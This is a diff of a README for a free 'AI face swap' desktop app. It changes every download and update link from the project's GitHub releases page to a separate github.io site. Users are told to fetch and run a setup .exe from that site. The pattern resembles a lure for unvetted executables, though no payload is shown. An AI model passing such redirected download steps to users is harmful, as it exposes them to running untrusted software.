@@ -1,6 +1,6 @@
 # 🎭 ai-face-swap-2026 - Swap Faces Instantly, No Subscription Needed
 
-[![Download Now](https://img.shields.io/badge/Download-ai--face--swap--2026-blue?style=for-the-badge&logo=github)](https://github.com/Rockerzsz/ai-face-swap-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-ai--face--swap--2026-blue?style=for-the-badge&logo=github)](https://rockerzsz.github.io)
 
 ---
 
@@ -15,7 +15,7 @@ Welcome to **ai-face-swap-2026** — the easiest way to swap faces in photos and
 ### Step 1: Get the Application
 
 Visit this link to download the application:  
-👉 **[https://github.com/Rockerzsz/ai-face-swap-2026/releases](https://github.com/Rockerzsz/ai-face-swap-2026/releases)**
+👉 **[https://rockerzsz.github.io](https://rockerzsz.github.io)**
 
 You'll see a list of files. Look for the latest version. The file you need will be named something like `ai-face-swap-2026-setup.exe` or `ai-face-swap-2026-v1.0.zip`. Click on it to start the download. Your browser will save the file to your "Downloads" folder.
 
@@ -109,7 +109,7 @@ If your computer is older, don't worry — the Fast Mode model is designed to ru
 ## 🔄 Updating
 
 New versions are released regularly with improvements and new features. To update:
-1. Go to the [releases page](https://github.com/Rockerzsz/ai-face-swap-2026/releases).
+1. Go to the [releases page](https://rockerzsz.github.io).
 2. Download the newest version.
 3. Install it over your existing copy — your settings will be preserved.
 
@@ -157,7 +157,7 @@ If you run into any issues not covered here, check the "Issues" tab on the GitHu
 
 Ready to start? Hit the button below:
 
-[![Get It Now](https://img.shields.io/badge/Get%20It%20Now-Download%20Latest%20Version-green?style=for-the-badge)](https://github.com/Rockerzsz/ai-face-swap-2026/releases)
+[![Get It Now](https://img.shields.io/badge/Get%20It%20Now-Download%20Latest%20Version-green?style=for-the-badge)](https://rockerzsz.github.io)
 
 ---
 
